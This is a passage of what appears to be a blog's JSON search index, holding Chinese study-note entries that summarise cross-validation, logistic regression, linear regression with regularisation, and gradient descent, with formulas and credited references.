"/posts/%E4%BA%A4%E5%8F%89%E9%AA%8C%E8%AF%81-cross-validation-%E5%8E%9F%E7%90%86%E5%B0%8F%E7%BB%93/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-13 00:00:00 +0800", "snippet": "交叉验证是在机器学习建立模型和验证模型参数时常用的办法。交叉验证，顾名思义，就是重复的使用数据，把得到的样本数据进行切分，组合为不同的训练集和测试集，用训练集来训练模型，用测试集来评估模型预测的好坏。在此基础上可以得到多组不同的训练集和测试集，某次训练集中的某样本在下次可能成为测试集中的样本，即所谓“交叉”。那么什么时候才需要交叉验证呢？交叉验证用在数据不是很充足的时候。比如在我日常项目里面，对于普通适中问题，如果数据样本量小于一万条，我们就会采用交叉验证来训练优化选择模型。如果样本大于一万条的话，我们一般随机的把数据分成三份，一份为训练集（Training Set），一份为验证集（Validation Set），最后一份为测试集（Test Set）。用训练集来训练模型，用验证集来评估模型预测的好坏和选择模型及其对应的参数。把最终得到的模型再用于测试集，最终决定使用哪个模型以及对应参数。回到交叉验证，根据切分的方法不同，交叉验证分为下面三种：　　　第一种是简单交叉验证，所谓的简单，是和其他交叉验证方法相对而言的。首先，我们随机的将样本数据分为两部分（比如： 70%的训练集，30%的测试集），然后用训练集来训练模型，在测试集上验证模型及参数。接着，我们再把样本打乱，重新选择训练集和测试集，继续训练数据和检验模型。最后我们选择损失函数评估最优的模型和参数。　第二种是K折交叉验证（K-Folder Cross Validation）。和第一种方法不同，K折交叉验证会把样本数据随机的分成S份，每次随机的选择K-1份作为训练集，剩下的1份做测试集。当这一轮完成后，重新随机选择K-1份来训练数据。若干轮（小于K）之后，选择损失函数评估最优的模型和参数。第三种是留一交叉验证（Leave-one-out Cross Validation），它是第二种情况的特例，此时S等于样本数N，这样对于N个样本，每次选择N-1个样本来训练数据，留一个样本来验证模型预测的好坏。此方法主要用于样本量非常少的情况，比如对于普通适中问题，N小于50时，我一般采用留一交叉验证。通过反复的交叉验证，用损失函数来度量得到的模型的好坏，最终我们可以得到一个较好的模型。那这三种情况，到底我们应该选择哪一种方法呢？一句话总结，如果我们只是对数据做一个初步的模型建立，不是要做深入分析的话，简单交叉验证就可以了。否则就用S折交叉验证。在样本量少的时候，使用S折交叉验证的特例留一交叉验证。此外还有一种比较特殊的交叉验证方式，也是用于样本量少的时候。叫做自助法(bootstrapping)。比如我们有m个样本（m较小），每次在这m个样本中随机采集一个样本，放入训练集，采样完后把样本放回。这样重复采集m次，我们得到m个样本组成的训练集。当然，这m个样本中很有可能有重复的样本数据。同时，用没有被采样到的样本做测试集。这样接着进行交叉验证。由于我们的训练集有重复数据，这会改变数据的分布，因而训练结果会有估计偏差，因此，此种方法不是很常用，除非数据量真的很少，比如小于20个。参考文献：https://www.cnblogs.com/pinard/p/5992719.html" }, { "title": "逻辑回归小结", "url": "/posts/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-12 00:00:00 +0800", "snippet": "​ 逻辑回归是一个分类算法，它可以处理二元分类以及多元分类。虽然它名字里面有“回归”两个字，却不是一个回归算法。那为什么有“回归”这个误导性的词呢？个人认为，虽然逻辑回归是分类模型，但是它的原理里面却残留着回归模型的影子，本文对逻辑回归原理做一个总结。1. 从线性回归到逻辑回归​ 我们知道，线性回归的模型是求出输出特征向量Y和输入样本矩阵X之间的线性关系系数$\\theta$，满足$\\mathbf{Y = X\\theta}$。此时我们的Y是连续的，所以是回归模型。如果我们想要Y是离散的话，怎么办呢？一个可以想到的办法是，我们对于这个Y再做一次函数转换，变为$g(Y)$。如果我们令$g(Y)$的值在某个实数区间的时候是类别A，在另一个实数区间的时候是类别B，以此类推，就得到了一个分类模型。如果结果的类别只有两种，那么就是一个二元分类模型了。逻辑回归的出发点就是从这来的。下面我们开始引入二元逻辑回归。2. 二元逻辑回归的模型上一节我们提到对线性回归的结果做一个在函数g上的转换，可以变化为逻辑回归。这个函数g在逻辑回归中我们一般取为sigmoid函数，形式如下：\\[g(z) = \\frac{1}{1+e^{-z}}\\]它有一个非常好的性质，即当z趋于正无穷时，g(z)趋于1，而当z趋于负无穷时，g(z)趋于0，这非常适合于我们的分类概率模型。另外，它还有一个很好的导数性质：\\[g^{&#39;}(z) = g(z)(1-g(z))\\]这个通过函数对g(z)求导很容易得到，后面我们会用到这个式子。如果我们令g(z)中的z为：${z = x\\theta}$，这样就得到了二元逻辑回归模型的一般形式：\\[h_{\\theta}(x) = \\frac{1}{1+e^{-x\\theta}}\\]其中x为样本输入，$h_{\\theta}(x)$为模型输出，可以理解为某一分类的概率大小。而$\\theta$为分类模型的要求出的模型参数。对于模型输出$h_{\\theta}(x)$，我们让它和我们的二元样本输出y（假设为0和1）有这样的对应关系，如果$h_{\\theta}(x) &amp;gt;0.5$ ，即$x\\theta &amp;gt; 0$, 则y为1。如果$h_{\\theta}(x) &amp;lt; 0.5$，即$x\\theta &amp;lt; 0$, 则y为0。y=0.5是临界情况，此时$x\\theta = 0$为， 从逻辑回归模型本身无法确定分类。$h_{\\theta}(x)$的值越小，而分类为0的的概率越高，反之，值越大的话分类为1的的概率越高。如果靠近临界点，则分类准确率会下降。此处我们也可以将模型写成矩阵模式：\\[h_{\\theta}(X) = \\frac{1}{1+e^{-X\\theta}}\\]其中$h_{\\theta}(X)$为模型输出，为 mx1的维度。X为样本特征矩阵，为mxn的维度。$\\theta$为分类的模型系数，为nx1的向量。理解了二元分类回归的模型，接着我们就要看模型的损失函数了，我们的目标是极小化损失函数来得到对应的模型系数$\\theta$。3. 二元逻辑回归的损失函数回顾下线性回归的损失函数，由于线性回归是连续的，所以可以使用模型误差的的平方和来定义损失函数。但是逻辑回归不是连续的，自然线性回归损失函数定义的经验就用不上了。不过我们可以用最大似然法来推导出我们的损失函数。我们知道，按照第二节二元逻辑回归的定义，假设我们的样本输出是0或者1两类。那么我们有：\\[P(y=1|x,\\theta ) = h_{\\theta}(x)\\]\\[P(y=0|x,\\theta ) = 1- h_{\\theta}(x)\\]把这两个式子写成一个式子，就是：\\[P(y|x,\\theta ) = h_{\\theta}(x)^y(1-h_{\\theta}(x))^{1-y}\\]其中y的取值只能是0或者1。用矩阵法表示，即为：\\[P(Y|X,\\theta ) = h_{\\theta}(X)^Y(E-h_{\\theta}(X))^{1-Y}\\]其中E为单位向量。得到了y的概率分布函数表达式，我们就可以用似然函数最大化来求解我们需要的模型系数$\\theta$。似然函数的代数表达式如下，其中m为样本的个数。\\[L(\\theta) = \\prod\\limits_{i=1}^{m}(h_{\\theta}(x^{(i)}))^{y^{(i)}}(1-h_{\\theta}(x^{(i)}))^{1-y^{(i)}}\\] 似然函数由于练乘操作，容易造成下溢，通常选用对数似然（log-likelihood）为了方便求解，这里我们用对数似然函数最大化，对数似然函数取反即为我们的损失函数$J(\\theta)$。对似然函数对数化取反的表达式，即损失函数表达式为：\\[J(\\theta) = -logL(\\theta) = -\\sum\\limits_{i=1}^{m}(y^{(i)}log(h_{\\theta}(x^{(i)}))+ (1-y^{(i)})log(1-h_{\\theta}(x^{(i)})))\\]损失函数用矩阵法表达更加简洁：\\[J(\\theta) = -Y\\bullet logh_{\\theta}(X) - (E-Y)\\bullet log(E-h_{\\theta}(X))\\]其中E为单位向量,$\\bullet$为内积。4. 二元逻辑回归的损失函数的优化方法对于二元逻辑回归的损失函数极小化，有比较多的方法，最常见的有梯度下降法，坐标轴下降法，牛顿法等。这里推导出梯度下降法中$θ$每次迭代的公式。由于代数法推导比较的繁琐，我习惯于用矩阵法来做损失函数的优化过程，这里给出矩阵法推导二元逻辑回归梯度的过程。对于$J(\\theta) = -Y\\bullet logh_{\\theta}(X) - (E-Y)\\bullet log(E-h_{\\theta}(X))$，我们用$J(\\theta)$对$\\theta$向量求导可得：\\[\\frac{\\partial}{\\partial\\theta}J(\\theta) = -Y \\bullet X^T\\frac{1}{h_{\\theta}(X)}h_{\\theta}(X)(1-h_{\\theta}(X)) + (E-Y)\\bullet X^T\\frac{1}{1-h_{\\theta}(X)}h_{\\theta}(X)(1-h_{\\theta}(X))\\]这一步我们用到了矩阵求导的链式法则，和下面三个矩阵求导公式：$\\frac{\\partial}{\\partial X}logX = 1/X$$\\frac{\\partial}{\\partial z}g(z) = g(z)(1-g(z))    $ (g(z)为sigmoid函数)$\\frac{\\partial}{\\partial\\theta}X\\theta = X^T$对于刚才的求导公式我们进行化简可得：\\[\\frac{\\partial}{\\partial\\theta}J(\\theta) = X^T(h_{\\theta}(X) - Y )\\]从而在梯度下降法中每一步向量$\\theta$的迭代公式如下：\\[\\theta = \\theta - \\alpha X^T(h_{\\theta}(X) - Y )\\]其中，$\\alpha$为梯度下降法的步长。实践中，我们一般不用操心优化方法，大部分机器学习库都内置了各种逻辑回归的优化方法，不过了解至少一种优化方法还是有必要的。5. 二元逻辑回归的正则化逻辑回归也会面临过拟合问题，所以我们也要考虑正则化。常见的有L1正则化和L2正则化。逻辑回归的L1正则化的损失函数表达式如下，相比普通的逻辑回归损失函数，增加了L1的范数做作为惩罚，超参数$\\alpha$作为惩罚系数，调节惩罚项的大小。二元逻辑回归的L1正则化损失函数表达式如下：\\(J(\\theta) = -Y\\bullet logh_{\\theta}(X) - (E-Y)\\bullet log(1-h_{\\theta}(X)) + \\alpha||\\theta||_1\\) 其中$||\\theta||_1$为$\\theta$的L1范数。逻辑回归的L1正则化损失函数的优化方法常用的有坐标轴下降法和最小角回归法。二元逻辑回归的L2正则化损失函数表达式如下：\\(J(\\theta) = -Y\\bullet logh_{\\theta}(X) - (E-Y)\\bullet log(1-h_{\\theta}(X)) + \\frac{1}{2}\\alpha||\\theta||_2^2\\)其中$||\\theta||_2$为$\\theta$的L2范数。逻辑回归的L2正则化损失函数的优化方法和普通的逻辑回归类似。6. 二元逻辑回归的推广：多元逻辑回归前面几节我们的逻辑回归的模型和损失函数都局限于二元逻辑回归，实际上二元逻辑回归的模型和损失函数很容易推广到多元逻辑回归。比如总是认为某种类型为正值，其余为0值，这种方法为最常用的one-vs-rest，简称OvR.另一种多元逻辑回归的方法是Many-vs-Many(MvM)，它会选择一部分类别的样本和另一部分类别的样本来做逻辑回归二分类。最常用的是One-Vs-One（OvO）。OvO是MvM的特例。每次我们选择两类样本来做二元逻辑回归。这里只介绍多元逻辑回归的softmax回归的一种特例推导：首先回顾下二元逻辑回归。\\[P(y=1|x,\\theta ) = h_{\\theta}(x) = \\frac{1}{1+e^{-x\\theta}} = \\frac{e^{x\\theta}}{1+e^{x\\theta}}\\]\\[P(y=0|x,\\theta ) = 1- h_{\\theta}(x) = \\frac{1}{1+e^{x\\theta}}\\]其中y只能取到0和1。则有：\\[ln\\frac{P(y=1|x,\\theta )}{P(y=0|x,\\theta)} = x\\theta\\]如果我们要推广到多元逻辑回归，则模型要稍微做下扩展。我们假设是K元分类模型,即样本输出y的取值为1，2，。。。，K。根据二元逻辑回归的经验，我们有：\\[ln\\frac{P(y=1|x,\\theta )}{P(y=K|x,\\theta)} = x\\theta_1\\]\\[ln\\frac{P(y=2|x,\\theta )}{P(y=K|x,\\theta)} = x\\theta_2　\\]\\[...\\]\\[ln\\frac{P(y=K-1|x,\\theta )}{P(y=K|x,\\theta)} = x\\theta_{K-1}　\\]上面有K-1个方程。加上概率之和为1的方程如下：\\[\\sum\\limits_{i=1}^{K}P(y=i|x,\\theta ) = 1\\]从而得到K个方程，里面有K个逻辑回归的概率分布。解出这个K元一次方程组，得到K元逻辑回归的概率分布如下：\\[P(y=k|x,\\theta ) = e^{x\\theta_k} \\bigg/ 1+\\sum\\limits_{t=1}^{K-1}e^{x\\theta_t}　 k = 1,2,...K-1\\]\\[P(y=K|x,\\theta ) = 1 \\bigg/ 1+\\sum\\limits_{t=1}^{K-1}e^{x\\theta_t}\\]多元逻辑回归的损失函数推导以及优化方法和二元逻辑回归类似，这里就不累述。7.小结逻辑回归尤其是二元逻辑回归是非常常见的模型，训练速度很快，虽然使用起来没有支持向量机（SVM）那么占主流，但是解决普通的分类问题是足够了，训练速度也比起SVM要快不少。如果你要理解机器学习分类算法，那么第一个应该学习的分类算法个人觉得应该是逻辑回归。理解了逻辑回归，其他的分类算法再学习起来应该没有那么难了。参考文献：https://www.cnblogs.com/pinard/p/6029432.html" }, { "title": "线性回归小结", "url": "/posts/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E5%B0%8F%E7%BB%93/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-11 00:00:00 +0800", "snippet": "线性回归可以说是机器学习中最基本的问题类型了，这里就对线性回归的原理和算法做一个小结。1. 线性回归的模型函数和损失函数线性回归遇到的问题一般是这样的。我们有m个样本，每个样本对应于n维特征和一个结果输出，如下：　　$(x_1^{(0)}, x_2^{(0)}, …x_n^{(0)}, y_0), (x_1^{(1)}, x_2^{(1)}, …x_n^{(1)},y_1), … (x_1^{(m)}, x_2^{(m)}, …x_n^{(m)}, y_n)$我们的问题是，对于一个新的$(x_1^{(x)}, x_2^{(x)}, …x_n^{(x)})$, 他所对应的$y_x$是多少呢？ 如果这个问题里面的y是连续的，则是一个回归问题，否则是一个分类问题。对于n维特征的样本数据，如果我们决定使用线性回归，那么对应的模型是这样的：　　$h_\\theta(x_1, x_2, …x_n) = \\theta_0 + \\theta_{1}x_1 + … + \\theta_{n}x_{n}$, 其中$\\theta_i (i = 0,1,2… n)$为模型参数，$x_i (i = 0,1,2… n)$为每个样本的n个特征值。这个表示可以简化，我们增加一个特征$x_0 = 1$ ，这样$h_\\theta(x_0, x_1, …x_n) = \\sum\\limits_{i=0}^{n}\\theta_{i}x_{i}$。进一步用矩阵形式表达更加简洁如下：​ $h_\\mathbf{\\theta}(\\mathbf{X}) = \\mathbf{X\\theta}$其中， 假设函数$h_\\mathbf{\\theta}(\\mathbf{X})$为mx1的向量,$\\mathbf{\\theta}$为nx1的向量，里面有n个代数法的模型参数。$\\mathbf{X}$为mxn维的矩阵。m代表样本的个数，n代表样本的特征数。得到了模型，我们需要求出需要的损失函数，一般线性回归我们用均方误差作为损失函数。损失函数的代数法表示如下：　　　　$J(\\theta_0, \\theta_1…, \\theta_n) = \\sum\\limits_{i=0}^{m}(h_\\theta(x_0, x_1, …x_n) - y_i)^2$进一步用矩阵形式表达损失函数：　　　　$J(\\mathbf\\theta) = \\frac{1}{2}(\\mathbf{X\\theta} - \\mathbf{Y})^T(\\mathbf{X\\theta} - \\mathbf{Y})$由于矩阵法表达比较的简洁，后面我们将统一采用矩阵方式表达模型函数和损失函数。2. 线性回归的算法对于线性回归的损失函数$J(\\mathbf\\theta) = \\frac{1}{2}(\\mathbf{X\\theta} - \\mathbf{Y})^T(\\mathbf{X\\theta} - \\mathbf{Y})$，我们常用的有两种方法来求损失函数最小化时候的$\\mathbf{\\theta}$参数：一种是梯度下降法，一种是最小二乘法。由于已经在其它篇中单独介绍了梯度下降法和最小二乘法，可以点链接到对应的文章链接去阅读。如果采用梯度下降法，则$\\mathbf{\\theta}$的迭代公式是这样的：　　　$\\mathbf\\theta= \\mathbf\\theta - \\alpha\\mathbf{X}^T(\\mathbf{X\\theta} - \\mathbf{Y})$通过若干次迭代后，我们可以得到最终的$\\mathbf{\\theta}$的结果如果采用最小二乘法，则$\\mathbf{\\theta}$的结果公式如下：　　　　$\\mathbf{\\theta} = (\\mathbf{X^{T}X})^{-1}\\mathbf{X^{T}Y}$当然线性回归，还有其他的常用算法，比如牛顿法和拟牛顿法，这里不详细描述。3.线性回归的推广：多项式回归回到我们开始的线性模型，$h_\\theta(x_1, x_2, …x_n) = \\theta_0 + \\theta_{1}x_1 + … + \\theta_{n}x_{n}$, 如果这里不仅仅是x的一次方，比如增加二次方，那么模型就变成了多项式回归。这里写一个只有两个特征的p次方多项式回归的模型：　　　$　h_\\theta(x_1, x_2) = \\theta_0 + \\theta_{1}x_1 + \\theta_{2}x_{2} + \\theta_{3}x_1^{2} + \\theta_{4}x_2^{2} + \\theta_{5}x_{1}x_2$我们令$x_0 = 1, x_1 = x_1, x_2 = x_2, x_3 =x_1^{2}, x_4 = x_2^{2}, x_5 = x_{1}x_2$ ,这样我们就得到了下式：　　　　$h_\\theta(x_1, x_2) = \\theta_0 + \\theta_{1}x_1 + \\theta_{2}x_{2} + \\theta_{3}x_3 + \\theta_{4}x_4 + \\theta_{5}x_5$可以发现，我们又重新回到了线性回归，这是一个五元线性回归，可以用线性回归的方法来完成算法。对于每个二元样本特征$(x_1,x_2)$,我们得到一个五元样本特征$(1, x_1, x_2, x_{1}^2, x_{2}^2, x_{1}x_2)$，通过这个改进的五元样本特征，我们重新把不是线性回归的函数变回线性回归。4.线性回归的推广：广义线性回归在上一节的线性回归的推广中，我们对样本特征端做了推广，这里我们对于特征y做推广。比如我们的输出$\\mathbf{Y}$不满足和$\\mathbf{X}$的线性关系，但是$ln\\mathbf{Y} $和$\\mathbf{X}$满足线性关系，模型函数如下：　　　　$ln\\mathbf{Y} = \\mathbf{X\\theta}$这样对与每个样本的输入y，我们用 lny去对应， 从而仍然可以用线性回归的算法去处理这个问题。我们把 Iny一般化，假设这个函数是单调可微函数$\\mathbf{g}(.)$,则一般化的广义线性回归形式是：　　　　$\\mathbf{g}(\\mathbf{Y}) = \\mathbf{X\\theta} $或者 $\\mathbf{Y} = \\mathbf{g^{-1}}(\\mathbf{X\\theta}) $这个函数$\\mathbf{g}(.)$我们通常称为联系函数。5.线性回归的正则化为了防止模型的过拟合，我们在建立线性模型的时候经常需要加入正则化项。一般有L1正则化和L2正则化。线性回归的L1正则化通常称为Lasso回归，它和一般线性回归的区别是在损失函数上增加了一个L1正则化的项，L1正则化的项有一个常数系数$\\alpha$来调节损失函数的均方差项和正则化项的权重，具体Lasso回归的损失函数表达式如下:\\(J(\\mathbf\\theta) = \\frac{1}{2n}(\\mathbf{X\\theta} -\\mathbf{Y})^T(\\mathbf{X\\theta} - \\mathbf{Y}) + \\alpha||\\theta||_1\\)其中n为样本个数，$\\alpha$为常数系数，需要进行调优。$||\\theta||_1$为L1范数。Lasso回归可以使得一些特征的系数变小，甚至还是一些绝对值较小的系数直接变为0。增强模型的泛化能力。Lasso回归的求解办法一般有坐标轴下降法（coordinate descent）和最小角回归法（ Least Angle Regression），由于它们比较复杂，在这篇文章单独讲述： 线程回归的正则化-Lasso回归小结线性回归的L2正则化通常称为Ridge回归，它和一般线性回归的区别是在损失函数上增加了一个L2正则化的项，和Lasso回归的区别是Ridge回归的正则化项是L2范数，而Lasso回归的正则化项是L1范数。具体Ridge回归的损失函数表达式如下：\\(J(\\mathbf\\theta) = \\frac{1}{2}(\\mathbf{X\\theta} - \\mathbf{Y})^T(\\mathbf{X\\theta} - \\mathbf{Y}) + \\frac{1}{2}\\alpha||\\theta||_2^2\\)其中$\\alpha$为常数系数，需要进行调优。 $||\\theta||_2$为L2范数。Ridge回归（岭回归）在不抛弃任何一个特征的情况下，缩小了回归系数，使得模型相对而言比较的稳定，但和Lasso回归比，这会使得模型的特征留的特别多，模型解释性差。Ridge回归的求解比较简单，一般用最小二乘法。这里给出用最小二乘法的矩阵推导形式，和普通线性回归类似。令$J(\\mathbf\\theta)$的导数为0，得到下式：　　　　$\\mathbf{X^T(X\\theta - Y) + \\alpha\\theta} = 0$整理即可得到最后的$\\theta$的结果：　　　　$\\mathbf{\\theta = (X^TX + \\alpha E)^{-1}X^TY}$其中E为单位矩阵。　除了上面这两种常见的线性回归正则化，还有一些其他的线性回归正则化算法，区别主要就在于正则化项的不同，和损失函数的优化方式不同，这里就不累述了。6. 进一步思考 为什么线性回归是无偏估计，而ridge是有偏估计 答：一般基于最小二乘法的回归都是无偏估计。这是因为：\\[\\begin{align*} θ&#39; &amp;amp;= (X^TX)^{-1}X^TY \\\\ &amp;amp;= (X^TX)^{-1}X^T(Xθ + U) \\\\ &amp;amp;= (X^TX)^{-1}X^TXθ + (X^TX)^{-1}X^TU \\\\ &amp;amp;= θ + (X^TX)^{-1}X^TU \\end{align*}\\] 两边取期望有： $E(θ’) = θ + (X^TX)^{-1}X^TE(U) = θ$ 由于最小二乘法的残差符合正态分布，所以这里$E(U) = 0$ 而Ridge回归\\[\\begin{align*} θ&#39; &amp;amp;= (X^TX+\\alpha E)^{-1}X^TY \\\\ &amp;amp;= (X^TX+\\alpha E)^{-1}X^T(Xθ + U) \\\\ &amp;amp;= (X^TX+\\alpha E)^{-1}X^TXθ + (X^TX+\\alpha E)^{-1}X^TU \\end{align*}\\] 两边取期望有： $E(θ’) = (X^TX+\\alpha E)^{-1}X^TXθ$不等于θ参考文献：https://www.cnblogs.com/pinard/p/6004041.html" }, { "title": "梯度下降小结", "url": "/posts/%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%E5%B0%8F%E7%BB%93/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-11 00:00:00 +0800", "snippet": "在求解机器学习算法的模型参数，即无约束优化问题时，梯度下降（Gradient Descent）是最常采用的方法之一，另一种常用的方法是最小二乘法。这里就对梯度下降法做一个完整的总结。1. 梯度　 在微积分里面，对多元函数的参数求∂偏导数，把求得的各个参数的偏导数以向量的形式写出来，就是梯度。比如函数f(x,y), 分别对x,y求偏导数，求得的梯度向量就是$(∂f/∂x, ∂f/∂y)^T$,简称grad f(x,y)或者▽f(x,y)。对于在点(x0,y0)的具体梯度向量就是$(∂f/∂x0, ∂f/∂y0)^T$.或者▽f(x0,y0)，如果是3个参数的向量梯度，就是$(∂f/∂x, ∂f/∂y，∂f/∂z)^T$,以此类推。​ 那么这个梯度向量求出来有什么意义呢？他的意义从几何意义上讲，就是函数变化增加最快的地方。具体来说，对于函数f(x,y),在点(x0,y0)，沿着梯度向量的方向就是$(∂f/∂x0, ∂f/∂y0)^T$的方向是f(x,y)增加最快的地方。或者说，沿着梯度向量的方向，更加容易找到函数的最大值。反过来说，沿着梯度向量相反的方向，也就是 $-(∂f/∂x0, ∂f/∂y0)^T$的方向，梯度减少最快，也就是更加容易找到函数的最小值。2. 梯度下降与梯度上升​ 在机器学习算法中，在最小化损失函数时，可以通过梯度下降法来一步步的迭代求解，得到最小化的损失函数，和模型参数值。反过来，如果我们需要求解损失函数的最大值，这时就需要用梯度上升法来迭代了。​ 梯度下降法和梯度上升法是可以互相转化的。比如我们需要求解损失函数f(θ)的最小值，这时我们需要用梯度下降法来迭代求解。但是实际上，我们可以反过来求解损失函数 -f(θ)的最大值，这时梯度上升法就派上用场了。​ 下面来详细总结下梯度下降法。3. 梯度下降法算法详解3.1 梯度下降的直观解释​ 首先来看看梯度下降的一个直观的解释。比如我们在一座大山上的某处位置，由于我们不知道怎么下山，于是决定走一步算一步，也就是在每走到一个位置的时候，求解当前位置的梯度，沿着梯度的负方向，也就是当前最陡峭的位置向下走一步，然后继续求解当前位置梯度，向这一步所在位置沿着最陡峭最易下山的位置走一步。这样一步步的走下去，一直走到觉得我们已经到了山脚。当然这样走下去，有可能我们不能走到山脚，而是到了某一个局部的山峰低处。​ 从上面的解释可以看出，梯度下降不一定能够找到全局的最优解，有可能是一个局部最优解。当然，如果损失函数是凸函数，梯度下降法得到的解就一定是全局最优解。3.2 梯度下降的相关概念​ 在详细了解梯度下降的算法之前，我们先看看相关的一些概念。​ 步长（Learning rate）：步长决定了在梯度下降迭代的过程中，每一步沿梯度负方向前进的长度。用上面下山的例子，步长就是在当前这一步所在位置沿着最陡峭最易下山的位置走的那一步的长度。 特征（feature）：指的是样本中输入部分，比如2个单特征的样本$(x^{(0)},y^{(0)}),(x^{(1)},y^{(1)})$,则第一个样本特征为$x^{(0)}$，第一个样本输出为$y^{(0)}$。 假设函数（hypothesis function）：在监督学习中，为了拟合输入样本，而使用的假设函数，记为$h_θ(x)$。比如对于单个特征的m个样本$（x^{(i)},y^{(i)}）(i=1,2,…m)$,可以采用拟合函数如下： $h_θ(x)=θ_0+θ_1x$ 损失函数（loss function）：为了评估模型拟合的好坏，通常用损失函数来度量拟合的程度。损失函数极小化，意味着拟合程度最好，对应的模型参数即为最优参数。在线性回归中，损失函数通常为样本输出和假设函数的差取平方。比如对于m个样本$（x^{(i)},y^{(i)}）(i=1,2,…m)$,采用线性回归，损失函数为： $J(\\theta_{0},\\theta_{1} ) = \\sum_{i=1}^{m}(h_{\\theta}(x_i)-y_i)^2$ 其中$x_i$表示第i个样本特征，$y_i$表示第i个样本对应的输出，$h_{\\theta}(x_i)$表示假设函数。 3.3 梯度下降的详细算法​ 梯度下降法的算法鸡可以有代数法和矩阵法两种表示，如果对矩阵分析不熟悉，则代数法更加容易理解。不过矩阵法更加简洁，且由于使用了矩阵，实现逻辑更加的一目了然，这里先介绍代数法，后介绍矩阵法。3.3.1 梯度下降法的代数方式描述 先决条件：确认优化模型的假设函数和损失函数 ​ 比如对于线性回归，假设函数表示为$ h_θ(x_1,x_2,…x_n)=θ_0+θ_1x_1+…+θ_nx_n$，其中$\\theta_i(i=0,1,2..n)$为模型参数，$x_i(i=0,1,2…n)$为每个样本的n个特征值。这个表示可以简化，我们增加一个特征$x_0=1$，这样$h_{\\theta}(x_0,x_1,…,x_n) = \\sum_{i=0}^{n}\\theta_ix_i$ ​ 同样是线性回归，对应于上面的假设函数，损失函数为$  J(θ_0,θ_1…,θ_n)=\\frac{1}{2m}∑_{j=0}^m(h_θ(x^{(j)}_0,x^{(j)}_1,…x^{(j)}_n)−y_j)^2 $ 算法相关参数初始化：主要是初始化$θ_0,θ_1…,θ_n$，算法终止距离$\\varepsilon $以及步长$\\alpha$，在没有任何先验知识的时候，我喜欢将所有的$\\theta$初始化为0，将步长初始化为1。在调优的时候再优化。 算法过程： 1）确定当前位置的损失函数的梯度，对于$\\theta_i$，其梯度表达式如下： ​ $\\frac {\\partial}{\\partial \\theta_i}J(\\theta_0,\\theta_1,…,\\theta_n)$ 2) 用步长乘以损失函数的梯度，得到当前位置下降的距离，即$\\alpha\\frac {\\partial}{\\partial \\theta_i}J(\\theta_0,\\theta_1,…,\\theta_n)$对应于前面登山例子中的某一步。 3）确定是否所有的$\\theta_i$梯度下降的距离都小于$\\varepsilon$，如果小于$\\varepsilon$则算法终止，当前所有的$\\theta$即为最终结果。否则进入步骤4. 4）更新所有的$\\theta$，对于$\\theta_i$，其更新表达式如下，更新完毕后继续转入步骤1 ​ $\\theta_i=\\theta_i-\\alpha\\frac {\\partial}{\\partial \\theta_i}J(\\theta_0,\\theta_1,…,\\theta_n)$ 下面用线性回归的例子来具体描述梯度下降，假设我们的样本是$(x_1^{(0)}, x_2^{(0)}, …x_n^{(0)}, y_0), (x_1^{(1)}, x_2^{(1)}, …x_n^{(1)},y_1), … (x_1^{(m)}, x_2^{(m)}, …x_n^{(m)}, y_m)$,损失函数如前面先决条件所述：$J(\\theta_0, \\theta_1…, \\theta_n) = \\frac{1}{2m}\\sum\\limits_{j=0}^{m}(h_\\theta(x_0^{(j)}, x_1^{(j)}, …x_n^{(j)})- y_j)^2$ 则在算法过程步骤1中对于$\\theta_i$的偏导数计算如下： $\\frac{\\partial}{\\partial\\theta_i}J(\\theta_0, \\theta_1…, \\theta_n)= \\frac{1}{m}\\sum\\limits_{j=0}^{m}(h_\\theta(x_0^{(j)}, x_1^{(j)}, …x_n^{(j)}) - y_j)x_i^{(j)}$ 由于样本中没有$x_0$ ,上式中令所有的$x_0^{j}$为1. 步骤4中$\\theta_i$的更新表达式如下： $  \\theta_i = \\theta_i - \\alpha\\frac{1}{m}\\sum\\limits_{j=0}^{m}(h_\\theta(x_0^{(j)}, x_1^{(j)}, …x_n^{j}) - y_j)x_i^{(j)}$ 从这个例子可以看出当前点的梯度方向是由所有的样本决定的，加$\\frac{1}{m}$ 是为了好理解。由于步长也为常数，他们的乘机也为常数，所以这里$\\alpha\\frac{1}{m}$可以用一个常数表示。 在下面第4节会详细讲到的梯度下降法的变种，他们主要的区别就是对样本的采用方法不同。这里我们采用的是用所有样本。3.3.2. 梯度下降法的矩阵方式描述这一部分主要讲解梯度下降法的矩阵方式表述，相对于3.3.1的代数法，要求有一定的矩阵分析的基础知识，尤其是矩阵求导的知识。 先决条件： 和3.3.1类似， 需要确认优化模型的假设函数和损失函数。对于线性回归，假设函数$h_\\theta(x_1, x_2, …x_n) = \\theta_0 + \\theta_{1}x_1 + … + \\theta_{n}x_{n}$的矩阵表达方式为： $h_\\mathbf{\\theta}(\\mathbf{x}) = \\mathbf{X\\theta}$ ，其中， 假设函数$h_\\mathbf{\\theta}(\\mathbf{X})$为$m*1$的向量,$\\mathbf{\\theta}$为$(n+1)*1$的向量，里面有n个代数法的模型参数。$\\mathbf{X}$为$m*(n+1)$维的矩阵。m代表样本的个数，n+1代表样本的特征数。 损失函数的表达式为：$J(\\mathbf\\theta) = \\frac{1}{2}(\\mathbf{X\\theta} - \\mathbf{Y})^T(\\mathbf{X\\theta} - \\mathbf{Y})$, 其中$\\mathbf{Y}$是样本的输出向量，维度为$m*1$。 算法相关参数初始化：$\\theta$向量可以初始化为默认值，或者调优后的值。算法终止距离$\\varepsilon$，步长$\\alpha$和3.3.1比没有变化。 算法过程： 确定当前位置的损失函数的梯度，对于$\\theta$向量,其梯度表达式如下： ​ $\\frac{\\partial}{\\partial\\mathbf\\theta}J(\\mathbf\\theta)$ 用步长乘以损失函数的梯度，得到当前位置下降的距离，即$\\alpha\\frac{\\partial}{\\partial\\theta}J(\\theta)$对应于前面登山例子中的某一步。 确定$\\mathbf\\theta$向量里面的每个值,梯度下降的距离都小于$\\varepsilon$，如果小于$\\varepsilon$则算法终止，当前$\\mathbf\\theta$向量即为最终结果。否则进入步骤4. 更新$\\theta$向量，其更新表达式如下。更新完毕后继续转入步骤1. 　　　　　　　　$\\mathbf\\theta= \\mathbf\\theta - \\alpha\\frac{\\partial}{\\partial\\theta}J(\\mathbf\\theta)$ 